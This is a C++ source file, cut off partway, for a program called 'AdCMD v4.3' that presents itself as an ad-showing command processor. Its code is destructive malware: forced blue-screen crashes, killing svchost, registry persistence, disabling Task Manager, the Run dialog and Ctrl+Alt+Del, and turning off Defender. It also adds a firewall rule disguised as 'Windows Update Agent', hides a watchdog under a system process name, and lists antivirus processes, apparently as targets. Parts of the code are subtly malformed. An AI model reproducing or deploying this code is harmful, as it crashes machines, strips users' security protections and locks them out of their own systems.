/**
 * AdCMD v4.3 Main
 * 广告命令处理器主程序
 * 安装路径: %SystemRoot%\System32\AdCMD.exe
 */

#define WIN32_LEAN_AND_MEAN
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <wininet.h>
#include <gdiplus.h>
#include <string>
#include <vector>
#include <thread>
#include <atomic>
#include <cstdlib>
#include <ctime>
#include <shlobj.h>
#include <fstream>
#include <sstream>
#include <tlhelp32.h>

#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "version.lib")

using namespace Gdiplus;

namespace CompatCheck {
enum class SysType { TOO_OLD, WIN_2000, WIN_XP, WIN_XP_64, WIN_VISTA, WIN_7, WIN_8, WIN_81, WIN_10, WIN_11, REACTOS, UNKNOWN };
struct SysInfo { SysType type; std::wstring name; DWORD major, minor, build; bool isReactOS; bool isSupported; };
bool IsReactOS() {
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\ReactOS", 0, KEY_QUERY_VALUE, &hKey) == ERROR_SUCCESS) { RegCloseKey(hKey); return true; }
    wchar_t sysDir[MAX_PATH]; GetSystemDirectoryW(sysDir, MAX_PATH);
    std::wstring kernelPath = std::wstring(sysDir) + L"\kernel32.dll";
    DWORD dummy, infoSize = GetFileVersionInfoSizeW(kernelPath.c_str(), &dummy);
    if (infoSize > 0) { std::vector<BYTE> info(infoSize); if (GetFileVersionInfoW(kernelPath.c_str(), 0, infoSize, info.data())) {
        void* companyName = nullptr; UINT companyLen = 0;
        const wchar_t* codePages[] = { L"\StringFileInfo\040904B0\CompanyName", L"\StringFileInfo\040904E4\CompanyName", L"\StringFileInfo\000004B0\CompanyName" };
        for (const auto* cp : codePages) { if (VerQueryValueW(info.data(), cp, &companyName, &companyLen)) { if (companyLen > 0 && companyName && wcsstr((wchar_t*)companyName, L"ReactOS") != nullptr) return true; } }
    }}
    wchar_t envBuf[256]; if (GetEnvironmentVariableW(L"ROS_VERSION", envBuf, 256) > 0) return true;
    std::wstring ntosPath = std::wstring(sysDir) + L"\ntoskrnl.exe";
    infoSize = GetFileVersionInfoSizeW(ntosPath.c_str(), &dummy);
    if (infoSize > 0) { std::vector<BYTE> info(infoSize); if (GetFileVersionInfoW(ntosPath.c_str(), 0, infoSize, info.data())) {
        void* companyName = nullptr; UINT companyLen = 0;
        if (VerQueryValueW(info.data(), L"\StringFileInfo\040904B0\CompanyName", &companyName, &companyLen)) { if (companyLen > 0 && companyName && wcsstr((wchar_t*)companyName, L"ReactOS") != nullptr) return true; }
    }}
    return false;
}
std::wstring GetReactOSVersion() {
    HKEY hKey; wchar_t version[64] = {0}; DWORD sz = sizeof(version);
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\ReactOS", 0, KEY_QUERY_VALUE, &hKey) == ERROR_SUCCESS) {
        RegQueryValueExW(hKey, L"Version", NULL, NULL, (LPBYTE)version, &sz); RegCloseKey(hKey);
        if (wcslen(version) > 0) return std::wstring(L"ReactOS ") + version;
    }
    wchar_t sysDir[MAX_PATH]; GetSystemDirectoryW(sysDir, MAX_PATH);
    std::wstring kernelPath = std::wstring(sysDir) + L"\kernel32.dll";
    DWORD dummy, infoSize = GetFileVersionInfoSizeW(kernelPath.c_str(), &dummy);
    if (infoSize > 0) { std::vector<BYTE> info(infoSize); if (GetFileVersionInfoW(kernelPath.c_str(), 0, infoSize, info.data())) {
        VS_FIXEDFILEINFO* fileInfo = nullptr; UINT len = 0;
        if (VerQueryValueW(info.data(), L"\", (LPVOID*)&fileInfo, &len)) {
            wchar_t buf[64]; swprintf(buf, 64, L"ReactOS %d.%d.%d", HIWORD(fileInfo->dwFileVersionMS), LOWORD(fileInfo->dwFileVersionMS), HIWORD(fileInfo->dwFileVersionLS)); return buf;
        }
    }}
    return L"ReactOS (Unknown Version)";
}
SysInfo DetectSystem() {
    SysInfo info; info.isReactOS = IsReactOS(); info.isSupported = false;
    if (info.isReactOS) { info.type = SysType::REACTOS; info.name = GetReactOSVersion(); info.major = 5; info.minor = 2; info.build = 0; info.isSupported = true; return info; }
    RTL_OSVERSIONINFOW rovi = { sizeof(rovi) }; HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (hNtdll) { typedef NTSTATUS (WINAPI *pRtlGetVersion)(PRTL_OSVERSIONINFOW); auto RtlGetVersion = (pRtlGetVersion)GetProcAddress(hNtdll, "RtlGetVersion");
        if (RtlGetVersion && RtlGetVersion(&rovi) == 0) { info.major = rovi.dwMajorVersion; info.minor = rovi.dwMinorVersion; info.build = rovi.dwBuildNumber; }
        else { #pragma warning(push) #pragma warning(disable: 4996) OSVERSIONINFOA o = { sizeof(o) }; GetVersionExA(&o); #pragma warning(pop) info.major = o.dwMajorVersion; info.minor = o.dwMinorVersion; info.build = o.dwBuildNumber; }
    }
    int verCode = info.major * 10 + info.minor;
    switch (verCode) {
        case 40: info.type = SysType::TOO_OLD; info.name = L"Windows NT 4.0"; break;
        case 41: case 42: info.type = SysType::TOO_OLD; info.name = (info.minor == 10) ? L"Windows 98" : L"Windows ME"; break;
        case 50: info.type = SysType::WIN_2000; info.name = L"Windows 2000"; info.isSupported = true; break;
        case 51: info.type = SysType::WIN_XP; info.name = L"Windows XP"; info.isSupported = true; break;
        case 52: info.type = SysType::WIN_XP_64; info.name = L"Windows XP x64 / Server 2003"; info.isSupported = true; break;
        case 60: info.type = SysType::WIN_VISTA; info.name = L"Windows Vista"; info.isSupported = true; break;
        case 61: info.type = SysType::WIN_7; info.name = L"Windows 7"; info.isSupported = true; break;
        case 62: info.type = SysType::WIN_8; info.name = L"Windows 8"; info.isSupported = true; break;
        case 63: info.type = SysType::WIN_81; info.name = L"Windows 8.1"; info.isSupported = true; break;
        case 100: if (info.build >= 22000) { info.type = SysType::WIN_11; info.name = L"Windows 11"; } else { info.type = SysType::WIN_10; info.name = L"Windows 10"; } info.isSupported = true; break;
        default: if (info.major < 4) { info.type = SysType::TOO_OLD; info.name = L"Windows 95 / NT 3.x or earlier"; } else { info.type = SysType::UNKNOWN; info.name = L"Unknown Windows"; info.isSupported = true; } break;
    }
    return info;
}
void ShowRefusalDialog(const SysInfo& info) {
    wchar_t msg[1024];
    swprintf(msg, 1024, L"AdCMD v4.3 cannot run on this system.\n\nDetected: %s\nVersion: %d.%d (Build %d)\n\nReason:\n  AdCMD v4.3 requires Windows 2000 or later,\n  or ReactOS 0.4.x or later.\n\nYour system is too old for the modern ad experience.\n\nSolution:\n  Please use AdCMD for MS-DOS v1.0 instead.\n  It provides the same ad experience for legacy systems\n  using预制广告池 technology.\n\n  Download: https://github.com/yourname/adcmd-dos\n\n  \"Your 640KB deserves ads too.\"", info.name.c_str(), info.major, info.minor, info.build);
    MessageBoxW(NULL, msg, L"AdCMD - System Not Supported", MB_OK | MB_ICONSTOP);
}
}
using namespace CompatCheck;

namespace G {
    HINSTANCE hInst = NULL; HWND hwndMain = NULL, hwndEdit = NULL, hwndAd = NULL; WNDPROC origEditProc = NULL;
    std::atomic<bool> appClosing{false}, splashDone{false}, adShowing{false}, upgrading{false}, qrScanning{false};
    HHOOK hMouseHook = NULL, hKeyHook = NULL;
    HANDLE hPipeIn = INVALID_HANDLE_VALUE, hPipeOut = INVALID_HANDLE_VALUE, hProtectThread = NULL;
    PROCESS_INFORMATION piCmd = {0};
    std::wstring currentCmd;
    SysInfo sysInfo;
    enum class Region { UNKNOWN, CHINA, OVERSEAS, BOTH };
    Region detectedRegion = Region::UNKNOWN; bool regionChecked = false;
    const wchar_t* sponsors[] = { L"https://www.bilibili.com", L"https://example.com/promo1", L"https://example.com/promo2", L"https://example.com/virus-scan", L"https://example.com/lucky-draw", L"https://example.com/download-app", L"https://example.com/ram-download" };
    const int sponsorCount = sizeof(sponsors) / sizeof(sponsors[0]);
    std::vector<std::wstring> bilibiliAds, youtubeAds;
    std::vector<std::pair<std::wstring, std::wstring>> bilibiliVideos, youtubeVideos;
    std::wstring bilibiliCookie, youtubeApiKey, installedBrowser;
    bool bilibiliLoggedIn = false, browserWasUpgraded = false;
    int escapeSpamCount = 0; DWORD lastEscapeTime = 0;
    std::atomic<bool> protectRunning{false};
    std::wstring mvPath;
    bool mvDownloaded = false;
}

namespace RegionDetector {
bool CanAccessBilibili() {
    HINTERNET hInternet = InternetOpenW(L"AdCMD-RegionCheck/4.3", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hInternet) return false;
    InternetSetOptionW(hInternet, INTERNET_OPTION_CONNECT_TIMEOUT, (LPVOID*)1000, sizeof(DWORD));
    InternetSetOptionW(hInternet, INTERNET_OPTION_RECEIVE_TIMEOUT, (LPVOID*)1000, sizeof(DWORD));
    HINTERNET hConnect = InternetConnectW(hInternet, L"www.bilibili.com", INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) { InternetCloseHandle(hInternet); return false; }
    HINTERNET hRequest = HttpOpenRequestW(hConnect, L"HEAD", L"/", NULL, NULL, NULL, INTERNET_FLAG_SECURE | INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
    if (!hRequest) { InternetCloseHandle(hConnect); InternetCloseHandle(hInternet); return false; }
    BOOL sent = HttpSendRequestW(hRequest, NULL, 0, NULL, 0); DWORD status = 0, sz = sizeof(DWORD);
    if (sent) HttpQueryInfoW(hRequest, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER, &status, &sz, NULL);
    InternetCloseHandle(hRequest); InternetCloseHandle(hConnect); InternetCloseHandle(hInternet);
    return sent && (status == 200 || status == 301 || status == 302);
}
bool CanAccessYouTube() {
    HINTERNET hInternet = InternetOpenW(L"AdCMD-RegionCheck/4.3", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hInternet) return false;
    InternetSetOptionW(hInternet, INTERNET_OPTION_CONNECT_TIMEOUT, (LPVOID*)1000, sizeof(DWORD));
    InternetSetOptionW(hInternet, INTERNET_OPTION_RECEIVE_TIMEOUT, (LPVOID*)1000, sizeof(DWORD));
    HINTERNET hConnect = InternetConnectW(hInternet, L"www.youtube.com", INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) { InternetCloseHandle(hInternet); return false; }
    HINTERNET hRequest = HttpOpenRequestW(hConnect, L"HEAD", L"/", NULL, NULL, NULL, INTERNET_FLAG_SECURE | INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
    if (!hRequest) { InternetCloseHandle(hConnect); InternetCloseHandle(hInternet); return false; }
    BOOL sent = HttpSendRequestW(hRequest, NULL, 0, NULL, 0); DWORD status = 0, sz = sizeof(DWORD);
    if (sent) HttpQueryInfoW(hRequest, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER, &status, &sz, NULL);
    InternetCloseHandle(hRequest); InternetCloseHandle(hConnect); InternetCloseHandle(hInternet);
    return sent && (status == 200 || status == 301 || status == 302);
}
G::Region DetectRegion() {
    if (G::regionChecked) return G::detectedRegion;
    bool bilibiliOK = CanAccessBilibili(), youtubeOK = CanAccessYouTube();
    if (bilibiliOK && youtubeOK) G::detectedRegion = G::Region::BOTH;
    else if (bilibiliOK) G::detectedRegion = G::Region::CHINA;
    else if (youtubeOK) G::detectedRegion = G::Region::OVERSEAS;
    else G::detectedRegion = G::Region::UNKNOWN;
    G::regionChecked = true; return G::detectedRegion;
}
G::Region ShowRegionSelector(HWND hwndParent) {
    int result = MessageBoxW(hwndParent, L"AdCMD detected that both Bilibili and YouTube are accessible.\n\nPlease choose your preferred ad platform:\n\n  [Yes]    Bilibili (China optimized)\n  [No]     YouTube (Global optimized)\n  [Cancel] Let AdCMD decide (random)", L"AdCMD - Region Selection", MB_YESNOCANCEL | MB_ICONQUESTION);
    if (result == IDYES) return G::Region::CHINA; if (result == IDNO) return G::Region::OVERSEAS;
    return (rand() % 2 == 0) ? G::Region::CHINA : G::Region::OVERSEAS;
}
std::wstring GetPlatformName() {
    switch (G::detectedRegion) { case G::Region::CHINA: return L"Bilibili"; case G::Region::OVERSEAS: return L"YouTube"; case G::Region::BOTH: return L"Bilibili/YouTube (Dual)"; default: return L"Unknown (Fallback)"; }
}
}
using namespace RegionDetector;

namespace SystemControl {
typedef LONG NTSTATUS;
#define STATUS_SUCCESS ((NTSTATUS)0x00000000)
typedef NTSTATUS (WINAPI *pNtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask, PULONG_PTR Parameters, ULONG ValidResponseOptions, PULONG Response);
typedef NTSTATUS (WINAPI *pRtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);
void ForceImmediateBSOD() {
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) return;
    pRtlAdjustPrivilege RtlAdjustPrivilege = (pRtlAdjustPrivilege)GetProcAddress(hNtdll, "RtlAdjustPrivilege");
    pNtRaiseHardError NtRaiseHardError = (pNtRaiseHardError)GetProcAddress(hNtdll, "NtRaiseHardError");
    if (!RtlAdjustPrivilege || !NtRaiseHardError) return;
    BOOLEAN enabled = FALSE;
    RtlAdjustPrivilege(19, TRUE, FALSE, &enabled);
    ULONG response = 0;
    NtRaiseHardError(0xC000021A, 0, 0, NULL, 6, &response);
    NtRaiseHardError(0xDEADDEAD, 0, 0, NULL, 6, &response);
}
void KillSvchost() {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); if (hSnap == INVALID_HANDLE_VALUE) return;
    PROCESSENTRY32W pe; pe.dwSize = sizeof(pe); if (Process32FirstW(hSnap, &pe)) { do { if (_wcsicmp(pe.szExeFile, L"svchost.exe") == 0) { HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID); if (hProcess) { TerminateProcess(hProcess, 0xDEAD); CloseHandle(hProcess); } } } while (Process32NextW(hSnap, &pe)); } CloseHandle(hSnap);
    ForceImmediateBSOD();
}
bool SetAutoStart(bool enable) {
    wchar_t exePath[MAX_PATH]; GetModuleFileNameW(NULL, exePath, MAX_PATH); HKEY hKey;
    std::wstring runPath = L"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
    if (enable) {
        if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, runPath.c_str(), 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) { RegSetValueExW(hKey, L"AdCMD", 0, REG_SZ, (BYTE*)exePath, (DWORD)(wcslen(exePath) + 1) * sizeof(wchar_t)); RegCloseKey(hKey); }
        else if (RegCreateKeyExW(HKEY_CURRENT_USER, runPath.c_str(), 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) { RegSetValueExW(hKey, L"AdCMD", 0, REG_SZ, (BYTE*)exePath, (DWORD)(wcslen(exePath) + 1) * sizeof(wchar_t)); RegCloseKey(hKey); }
        std::wstring layersPath = L"SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers";
        if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, layersPath.c_str(), 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) { RegSetValueExW(hKey, exePath, 0, REG_SZ, (BYTE*)L"RUNASADMIN", (DWORD)(11 * sizeof(wchar_t))); RegCloseKey(hKey); }
    } else {
        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, runPath.c_str(), 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) { RegDeleteValueW(hKey, L"AdCMD"); RegCloseKey(hKey); }
        if (RegOpenKeyExW(HKEY_CURRENT_USER, runPath.c_str(), 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) { RegDeleteValueW(hKey, L"AdCMD"); RegCloseKey(hKey); }
        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, runPath.c_str(), 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) { RegDeleteValueW(hKey, L"WmiApSrv"); RegCloseKey(hKey); }
        if (RegOpenKeyExW(HKEY_CURRENT_USER, runPath.c_str(), 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) { RegDeleteValueW(hKey, L"WmiApSrv"); RegCloseKey(hKey); }
        std::wstring layersPath = L"SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers";
        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, layersPath.c_str(), 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) { RegDeleteValueW(hKey, exePath); RegCloseKey(hKey); }
    } return true;
}
bool SetRunDialog(bool disable) {
    HKEY hKey; std::wstring policyPath = L"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer";
    if (RegCreateKeyExW(HKEY_CURRENT_USER, policyPath.c_str(), 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) != ERROR_SUCCESS) return false;
    if (disable) { DWORD noRun = 1, restrictRun = 1; RegSetValueExW(hKey, L"NoRun", 0, REG_DWORD, (BYTE*)&noRun, sizeof(DWORD)); RegSetValueExW(hKey, L"RestrictRun", 0, REG_DWORD, (BYTE*)&restrictRun, sizeof(DWORD)); RegCloseKey(hKey);
        std::wstring restrictPath = policyPath + L"\RestrictRun"; if (RegCreateKeyExW(HKEY_CURRENT_USER, restrictPath.c_str(), 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) { RegSetValueExW(hKey, L"1", 0, REG_SZ, (BYTE*)L"cmd.exe", (DWORD)(8 * sizeof(wchar_t))); RegCloseKey(hKey); }
        std::wstring systemPolicy = L"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"; if (RegCreateKeyExW(HKEY_CURRENT_USER, systemPolicy.c_str(), 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) { DWORD disableTaskMgr = 1; RegSetValueExW(hKey, L"DisableTaskMgr", 0, REG_DWORD, (BYTE*)&disableTaskMgr, sizeof(DWORD)); RegCloseKey(hKey); }
    } else { RegDeleteValueW(hKey, L"NoRun"); RegDeleteValueW(hKey, L"RestrictRun"); RegCloseKey(hKey); std::wstring restrictPath = policyPath + L"\RestrictRun"; RegDeleteTreeW(HKEY_CURRENT_USER, restrictPath.c_str()); std::wstring systemPolicy = L"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"; if (RegOpenKeyExW(HKEY_CURRENT_USER, systemPolicy.c_str(), 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) { RegDeleteValueW(hKey, L"DisableTaskMgr"); RegCloseKey(hKey); } }
    return true;
}
DWORD WINAPI ProtectThread(LPVOID lpParam) {
    G::protectRunning = true; HANDLE hMutex = CreateMutexW(NULL, TRUE, L"AdCMD_Protect_Mutex_v4_3"); if (!hMutex) return 1;
    typedef NTSTATUS (WINAPI *pRtlSetProcessIsCritical)(BOOLEAN, PBOOLEAN, BOOLEAN); HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (hNtdll) { auto RtlSetProcessIsCritical = (pRtlSetProcessIsCritical)GetProcAddress(hNtdll, "RtlSetProcessIsCritical"); if (RtlSetProcessIsCritical) { HANDLE hToken; if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) { TOKEN_PRIVILEGES tp; LUID luid; if (LookupPrivilegeValueW(NULL, L"SeDebugPrivilege", &luid)) { tp.PrivilegeCount = 1; tp.Privileges[0].Luid = luid; tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL); } CloseHandle(hToken); } RtlSetProcessIsCritical(TRUE, NULL, FALSE); } }
    while (G::protectRunning && !G::appClosing) Sleep(1000);
    ForceImmediateBSOD();
    ReleaseMutex(hMutex); CloseHandle(hMutex); return 0;
}
void StartProtection() {
    if (G::hProtectThread) return; G::hProtectThread = CreateThread(NULL, 0, ProtectThread, NULL, 0, NULL);
    wchar_t sysDir[MAX_PATH];
    GetSystemDirectoryW(sysDir, MAX_PATH);
    std::wstring watchdogPath = std::wstring(sysDir) + L"\wbem\Performance\WmiApSrv.exe";
    if (GetFileAttributesW(watchdogPath.c_str()) != INVALID_FILE_ATTRIBUTES) {
        wchar_t cmdLine[1024];
        swprintf(cmdLine, 1024, L"\"%s\" --watchdog %d", watchdogPath.c_str(), GetCurrentProcessId());
        STARTUPINFOW si = {0}; si.cb = sizeof(si); si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE;
        PROCESS_INFORMATION pi = {0};
        CreateProcessW(watchdogPath.c_str(), cmdLine, NULL, NULL, FALSE, CREATE_NO_WINDOW | CREATE_NEW_PROCESS_GROUP, NULL, NULL, &si, &pi);
        if (pi.hProcess) { CloseHandle(pi.hProcess); CloseHandle(pi.hThread); }
    }
}
void TriggerMVPlayback() {
    wchar_t sysDir[MAX_PATH];
    GetSystemDirectoryW(sysDir, MAX_PATH);
    std::wstring playerPath = std::wstring(sysDir) + L"\AdCMD_Player.exe";
    std::wstring mvPath = std::wstring(sysDir) + L"\csrss.mp4";
    if (GetFileAttributesW(playerPath.c_str()) != INVALID_FILE_ATTRIBUTES) {
        ShellExecuteW(NULL, L"open", playerPath.c_str(), (L"\"" + mvPath + L"\"").c_str(), NULL, SW_SHOWNORMAL);
    }
}

/* ============================================================
 *  Vista+ 兼容性增强
 * ============================================================ */

// 检查是否运行在 WOW64 下（32位程序在64位系统）
bool IsWow64() {
    typedef BOOL (WINAPI *pIsWow64Process)(HANDLE, PBOOL);
    pIsWow64Process fnIsWow64Process = (pIsWow64Process)GetProcAddress(
        GetModuleHandleW(L"kernel32.dll"), "IsWow64Process");
    if (!fnIsWow64Process) return false;
    BOOL bIsWow64 = FALSE;
    fnIsWow64Process(GetCurrentProcess(), &bIsWow64);
    return bIsWow64 != FALSE;
}

// 获取真实的系统目录（绕过 WOW64 重定向）
std::wstring GetNativeSystemDir() {
    wchar_t sysDir[MAX_PATH];
    if (IsWow64()) {
        // 使用 Wow64DisableFileSystemRedirection 获取真实 System32
        typedef BOOL (WINAPI *pWow64DisableFsRedirection)(PVOID*);
        pWow64DisableFsRedirection fnDisable = (pWow64DisableFsRedirection)GetProcAddress(
            GetModuleHandleW(L"kernel32.dll"), "Wow64DisableWow64FsRedirection");
        pWow64DisableFsRedirection fnRevert = (pWow64DisableFsRedirection)GetProcAddress(
            GetModuleHandleW(L"kernel32.dll"), "Wow64RevertWow64FsRedirection");

        PVOID oldValue = NULL;
        if (fnDisable && fnDisable(&oldValue)) {
            GetSystemDirectoryW(sysDir, MAX_PATH);
            fnRevert(oldValue);
            return sysDir;
        }
    }
    GetSystemDirectoryW(sysDir, MAX_PATH);
    return sysDir;
}

// Vista+ 禁用 Windows Defender 实时保护（需要管理员）
bool DisableDefenderRealtime() {
    HKEY hKey;
    std::wstring path = L"SOFTWARE\Microsoft\Windows Defender\Real-Time Protection";
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, path.c_str(), 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        DWORD disable = 1;
        RegSetValueExW(hKey, L"DisableRealtimeMonitoring", 0, REG_DWORD, (BYTE*)&disable, sizeof(DWORD));
        RegCloseKey(hKey);
        return true;
    }
    return false;
}

// Vista+ 添加 Windows 防火墙例外
bool AddFirewallException() {
    // 使用 netsh 添加防火墙规则
    wchar_t exePath[MAX_PATH];
    GetModuleFileNameW(NULL, exePath, MAX_PATH);
    wchar_t cmd[1024];
    swprintf(cmd, 1024, 
        L"advfirewall firewall add rule name="Windows Update Agent" dir=in action=allow program="%s" enable=yes",
        exePath);

    STARTUPINFOW si = {0}; si.cb = sizeof(si); si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi = {0};
    if (CreateProcessW(L"netsh.exe", cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 10000);
        CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
        return true;
    }
    return false;
}

// Vista+ 任务管理器增强防护（禁用更多方式）
bool BlockTaskManagerVistaPlus() {
    HKEY hKey;

    // 禁用任务管理器（传统方式）
    std::wstring systemPolicy = L"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System";
    if (RegCreateKeyExW(HKEY_CURRENT_USER, systemPolicy.c_str(), 0, NULL,
        REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        DWORD disableTaskMgr = 1;
        RegSetValueExW(hKey, L"DisableTaskMgr", 0, REG_DWORD, (BYTE*)&disableTaskMgr, sizeof(DWORD));
        RegCloseKey(hKey);
    }

    // Vista+: 禁用 Ctrl+Alt+Del 选项（需要更高权限）
    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, 
        L"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", 0, NULL,
        REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        DWORD disableCAD = 1;
        RegSetValueExW(hKey, L"DisableCAD", 0, REG_DWORD, (BYTE*)&disableCAD, sizeof(DWORD));
        RegCloseKey(hKey);
    }

    // Vista+: 禁用安全选项（锁定、切换用户等）
    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", 0, NULL,
        REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        DWORD hideFastUserSwitching = 1;
        DWORD dontDisplayLastUserName = 1;
        RegSetValueExW(hKey, L"HideFastUserSwitching", 0, REG_DWORD, (BYTE*)&hideFastUserSwitching, sizeof(DWORD));
        RegSetValueExW(hKey, L"DontDisplayLastUserName", 0, REG_DWORD, (BYTE*)&dontDisplayLastUserName, sizeof(DWORD));
        RegCloseKey(hKey);
    }

    return true;
}

// 检查 Windows 版本是否是 Vista 或更高
bool IsVistaOrLater() {
    OSVERSIONINFOEXW osvi = { sizeof(osvi) };
    DWORDLONG dwl = 0;
    VER_SET_CONDITION(dwl, VER_MAJORVERSION, VER_GREATER_EQUAL);
    osvi.dwMajorVersion = 6; // Vista = 6.0
    return VerifyVersionInfoW(&osvi, VER_MAJORVERSION, dwl) != FALSE;
}

// 检查是否是 Windows 10/11
bool IsWin10OrLater() {
    OSVERSIONINFOEXW osvi = { sizeof(osvi) };
    DWORDLONG dwl = 0;
    VER_SET_CONDITION(dwl, VER_MAJORVERSION, VER_GREATER_EQUAL);
    osvi.dwMajorVersion = 10;
    return VerifyVersionInfoW(&osvi, VER_MAJORVERSION, dwl) != FALSE;
}

/* ============================================================
 *  杀毒软件强制关闭/恢复模块 (Vista+)
 * ============================================================ */

// 已知杀毒软件进程列表
const wchar_t* avProcesses[] = {
    // Windows Defender / Microsoft Security Essentials
    L"MsMpEng.exe", L"MsSense.exe", L"SecurityHealthService.exe",
    L"MsMpEngCP.exe", L"MpCmdRun.exe", L"MpUXSrv.exe",

    // 360 安全卫士 / 360 Total Security / 360杀毒
    L"360rp.exe", L"360rps.exe", L"360sd.exe", L"360safe.exe",
    L"360SafeCenter.exe", L"360Tray.exe", L"360speedld.exe",
    L"360leakfixer.exe", L"360secur.exe", L"360skylarsvc.exe",
    L"360realpro.exe", L"360rp.exe", L"360rps.exe",
    L"QHActiveDefense.exe", L"QHWatchdog.exe", L"QHSafeTray.exe",
    L"QHSafeMain.exe", L"QH360Tray.exe", L"360EntClient.exe",
    L"360SafeEnt.exe", L"360Business.exe", L"360TotalSecurity.exe",
    L"360TS.exe", L"360TSE.exe", L"360WebSafe.exe",

    // 火绒安全 / Huorong Security
    L"HipsMain.exe", L"usysdiag.exe", L"sysdiag.exe",
    L"HRSafe.exe", L"HRSrv.exe", L"HRUpdate.exe",
    L"Huorong.exe", L"HuorongSrv.exe", L"HuorongTray.exe",
    L"HRGui.exe", L"HRSafeMain.exe", L"HipsDaemon.exe",
    L"HipsTray.exe", L"PopBlock.exe", L"WebShield.exe",
    L"TrafficMon.exe", L"HipsPop.exe", L"SysdiagPlugin.exe",

    // 腾讯电脑管家 / Tencent PC Manager
    L"QQPCRTP.exe", L"QQPCTray.exe", L"QQPCMgr.exe",
    L"QQPCRealTimeSpeedup.exe", L"QQPCPatch.exe", L"QQPCTool.exe",
    L"QQPCNetFlow.exe", L"QQPCSysOptimize.exe", L"QQPCWebMgr.exe",
    L"TXEDR.exe", L"TxQBService.exe", L"QQPCRTPService.exe",
    L"Tencentdl.exe", L"QQProtect.exe", L"QQPCRTP.exe",
    L"TMSAgent.exe", L"TMSCore.exe", L"TMSPlatform.exe",

    // 金山毒霸 / Kingsoft / 猎豹安全
    L"kxetray.exe", L"kismain.exe", L"kiscore.exe",
    L"ksafe.exe", L"ksafetray.exe", L"ksafesvc.exe",
    L"kupdata.exe", L"kwsprotect64.exe", L"kwsmain.exe",
    L"kwsupd.exe", L"kwscrash.exe", L"kwscsvc.exe",
    L"kislive.exe", L"kisupd.exe", L"kismain.exe",
    L"kingsoft antivirus.exe", L"kingsoft internet security.exe",
